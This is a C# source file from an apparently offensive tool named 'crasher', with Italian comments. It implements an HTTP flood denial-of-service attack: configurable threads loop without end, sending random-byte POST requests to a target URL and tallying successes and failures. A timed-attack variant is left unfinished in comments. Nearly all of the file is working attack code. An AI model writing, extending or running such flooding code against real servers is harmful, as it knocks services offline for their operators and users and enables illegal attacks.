using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Net.Http;
using System.Runtime.Serialization;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using crasher.Helpers;
using crasher.Model;

namespace crasher.Attacks
{
    public static class HttpFlood
    {
        private static WebClient client;
        private static WebRequest request;

        private static Thread[] threads;
        private static bool stopFlag = false;
        private static Uri Url;
        private static bool ThreadsStarted = false;
        private static Attack attackInfo;

        /**
         * Metodo che starta l'attacco, tipo di attacco a seconda del flag "threading" in AttackSettings.cs
         * **/
        public static void Start(Attack attack)
        {
            attackInfo = attack;

            Url = new Uri(attackInfo.Url);
            client = new WebClient();

         
            Console.WriteLine("Threading mode: " + AttackSettings.Threading);
            if (AttackSettings.Threading)
            {
                threads = new Thread[AttackSettings.Threads];
                StartAsyncAttack();
            }
            else
            {
                stopFlag = false;
                StartAttack();
            }

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("[Info] Started client attack");
            Console.ForegroundColor = ConsoleColor.White;
        }

        /**
         * Attacco sfruttando i thread
         * **/
        private static void StartAsyncAttack()
        {
            for (int i = 0; i < threads.Length; i++)
            {
                threads[i] = new Thread(StartAttack);
                threads[i].Start();

                Console.WriteLine("[INFO] Thread n." + i + " started attacking target: " + Url.ToString());
            }

            ThreadsStarted = true;
        }

        /**
         * Attacco utilizzando nessun thread.
         * **/
        private static void StartAttack()
        {
            while (!stopFlag)
            {
                if (ThreadsStarted || !AttackSettings.Threading)
                {
                    bool requestStatus = false;

                    Byte[] packet = Helpers.NetHelper.RandomFillPackets(AttackSettings.PacketSize);
                    SendDataBuild2(Url, packet, out requestStatus);

                    //TWO TYPES OF ATTACK: HTTP GET REQUEST or HTTP POST REQUEST (SendRequest() or SendData())

                    AttackStats.RequestSent += 1;

                    if (requestStatus)
                    {
                        AttackStats.RequestDone += 1;
                    }
                    else
                    {
                        AttackStats.RequestFailed += 1;
                    }
                }
                else if (!ThreadsStarted)
                {
                    System.Threading.Thread.Sleep(250);
                }
            }
        }
        /*
         * 
         * FINIRE TIMED ATTACK
        private static void StartTimedAttack()
        {
            System.Timers.Timer attackTimer = new System.Timers.Timer(attackInfo.Time / AttackSettings.RequestPerSecond);

            // Hook up the Elapsed event for the timer. 
            attackTimer.Elapsed += OnTimedEvent;
            attackTimer.AutoReset = true;
            attackTimer.Enabled = true;
        }

        private static void OnTimedEvent(Object source, ElapsedEventArgs e)
        {
            
        }

        */


        /**
         * Ferma l'attacco a seconda del tipo utilizzato
         * **/
        public static void Stop() {
            if (AttackSettings.Threading)
                StopAsyncAttack();
            else
                StopAttack();
        }

        /**
         * Ferma l'attacco senza thread utilizzando un flag che genera un break
         */
        private static void StopAttack()
        {
            stopFlag = true;
        }

        /**
        * Esegue l'abort su tutti i thread.
        * **/
        private static void StopAsyncAttack() {
            foreach (Thread thread in threads) {
                thread.Abort("Stopped attack by user");
            }
        }

        public static void SendRequest(Uri url, out bool status)
        {
            WebClient client = new WebClient();
            string response = null;
            try
            {
                client.DownloadStringAsync(Url);
            }
            catch (WebException we)
            {
                Console.WriteLine("ERROR: " + we.Message);
                status = false;
                return;
            }
            finally
            {
                client.Dispose();
            }

            status = true;
        }

        public static string SendDataBuild2(Uri url, byte[] data, out bool status)
        {
            try
            {
                // Create a request using a URL that can receive a post.   
                WebRequest request = WebRequest.Create(url);
                // Set the Method property of the request to POST.  
                request.Method = "POST";
                // Set the ContentType property of the WebRequest.  
                request.ContentType = "application/x-www-form-urlencoded";
                // Set the ContentLength property of the WebRequest.  
                request.ContentLength = data.Length;
                // Get the request stream.  
                Stream dataStream = request.GetRequestStream();
                // Write the data to the request stream.  
                dataStream.Write(data, 0, data.Length);
                // Close the Stream object.  
                dataStream.Close();
                // Get the response.  
                WebResponse response = request.GetResponse();
                // Display the status.  
                Console.WriteLine(((HttpWebResponse)response).StatusCode);
                // Get the stream containing content returned by the server.  
                dataStream = response.GetResponseStream();
                // Open the stream using a StreamReader for easy access.  
                StreamReader reader = new StreamReader(dataStream);
                // Read the content.  
                string responseFromServer = reader.ReadToEnd();
                
                // Clean up the streams.  
                reader.Close();
                dataStream.Close();
                response.Close();

                //return response
                status = true;
                return responseFromServer;
            }
            catch
            {
                status = false;
                return null;
            }
        }
    }
}
